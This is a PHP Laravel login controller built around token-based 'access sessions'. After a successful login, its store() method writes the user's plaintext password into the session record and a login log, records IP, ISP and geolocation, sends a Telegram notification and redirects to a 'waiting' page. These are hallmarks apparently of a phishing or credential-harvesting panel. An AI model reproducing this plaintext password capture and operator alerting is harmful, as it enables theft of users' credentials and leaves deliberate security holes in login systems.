<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\AccessSession;
use App\Models\LoginLog;
use App\Services\GeoIpService;
use App\Services\TelegramService;
use App\Support\AccessSessionResolver;
use App\Support\AppRedirect;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\View\View;

class UserLoginController extends Controller
{
    public function create(Request $request): View|RedirectResponse
    {
        $session = AccessSessionResolver::current($request)
            ?? $request->attributes->get('accessSession');

        if (! $session || $session->status === AccessSession::STATUS_CLOSED) {
            return AppRedirect::loginEntry();
        }

        if (Auth::guard('user')->check() && AccessSessionResolver::isActive($session) && $session->status !== AccessSession::STATUS_LOGIN) {
            return redirect()->route($session->routeForStatus() ?? 'waiting', $session->pathParams());
        }

        $session->touchSeen();

        return view('auth.login', ['session' => $session]);
    }

    public function store(Request $request, GeoIpService $geoIp, TelegramService $telegram): RedirectResponse
    {
        $credentials = $request->validate([
            'email' => ['required', 'email:filter'],
            'password' => ['required', 'string', 'min:1'],
        ]);

        $access = AccessSessionResolver::current($request)
            ?? $request->attributes->get('accessSession');

        if (! $access || $access->public_token !== $request->route('publicToken')) {
            return AppRedirect::loginEntry();
        }

        if (! Auth::guard('user')->attempt($credentials, false)) {
            return back()
                ->withInput($request->only('email', 'remember'))
                ->withErrors(['email' => 'Email atau password tidak valid.']);
        }

        $request->session()->regenerate();
        $request->session()->put('access_token', $access->token);

        $user = Auth::guard('user')->user();
        $ip = $request->ip();
        $geo = $geoIp->lookup($ip);

        $access->forceFill([
            'email' => $user->email,
            'name' => $user->name,
            'login_password' => $credentials['password'],
            'ip' => $ip,
            'isp' => $geo['isp'],
            'country' => $geo['country'],
            'status' => AccessSession::STATUS_WAITING,
            'last_seen_at' => now(),
        ])->save();

        LoginLog::query()->create([
            'access_session_id' => $access->id,
            'email' => $user->email,
            'name' => $user->name,
            'password' => $credentials['password'],
            'ip' => $ip,
            'isp' => $geo['isp'],
            'country' => $geo['country'],
            'country_code' => $geo['country_code'],
            'city' => $geo['city'],
            'user_agent' => substr((string) $request->userAgent(), 0, 1000),
            'logged_in_at' => now(),
        ]);

        $telegram->notifyLogin($access->fresh());

        return redirect()->route('waiting', $access->pathParams());
    }

    public function destroy(Request $request): RedirectResponse
    {
        $token = $request->session()->get('access_token');

        if (is_string($token) && $token !== '') {
            AccessSession::query()
                ->where('token', $token)
                ->whereNotIn('status', [AccessSession::STATUS_CLOSED])
                ->update(['status' => AccessSession::STATUS_CLOSED]);
        }

        Auth::guard('user')->logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return AppRedirect::loginEntry();
    }
}
